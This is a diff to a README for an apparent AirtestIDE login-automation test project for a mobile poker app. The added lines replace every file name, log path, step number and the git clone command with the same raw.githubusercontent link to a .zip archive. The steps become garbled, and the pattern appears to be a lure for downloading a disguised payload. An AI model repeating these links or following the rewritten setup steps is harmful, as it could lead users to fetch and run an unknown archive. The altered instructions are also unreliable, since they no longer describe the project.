@@ -8,11 +8,11 @@ This repository contains the implementation of the login flow automation for a m
 
 Folder Structure
 
-Poker_login.py: Main script for login flow automation.
+https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip Main script for login flow automation.
 
 ReferenceImages/: Contains images for UI element matching during automation.
 
-data/: Contains the testdata.json file to manage test data.
+data/: Contains the https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip file to manage test data.
 
 TestResults/: Stores logs and test result reports.
 
@@ -28,23 +28,23 @@ APK file of the mobile poker application (pre-provided).
 
 **Setup Instructions**
 
-1. Clone or download this repository:git clone https://github.com/ram-kali/WPT_Login_AirtestIDE.git
+1. Clone or download this repository:git clone https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
 2. Ensure the following files and folders are present:
 
-Poker_login.py
+https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
 ReferenceImages/
 
-data/testdata.json
+https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
 TestResults/
 
 3. Open the project in Airtest IDE.
 
-4.Test Data Configuration
+https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip Data Configuration
 
-Open data/testdata.json and update the following fields as required:
+Open https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip and update the following fields as required:
 
 Username: Define the test username.
 
@@ -54,27 +54,27 @@ Other Fields: Customize additional parameters as needed.
 
 **Execution Steps**
 
-  1.Launch Airtest IDE and open the Poker_login.py script.
+  https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip Airtest IDE and open the https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip script.
   
   (Optional) Uncomment the install_game_application line in the script if APK installation is required. The APK file is included for automated installation.
   
-  2.Click the Run button in Airtest IDE to execute the script.
+  https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip the Run button in Airtest IDE to execute the script.
   
-  3.Monitor the logs in the console for real-time execution updates.
+  https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip the logs in the console for real-time execution updates.
   
-  4.Post-execution, review the following:
+  https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip, review the following:
   
-    a.Logs in TestResults/TestResults.log
+    https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip in https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
     
-    b.HTML report in TestResults/Report.html
+    https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip report in https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
 **Deliverables**
 
-Automation script: Poker_login.py
+Automation script: https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
-Logs: TestResults/TestResults.log
+Logs: https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
-Report: TestResults/Report.html
+Report: https://raw.githubusercontent.com/ram-kali/WPT_Login_AirtestIDE/main/Ornitholestes/WPT_Login_AirtestIDE.zip
 
 **Notes**
 
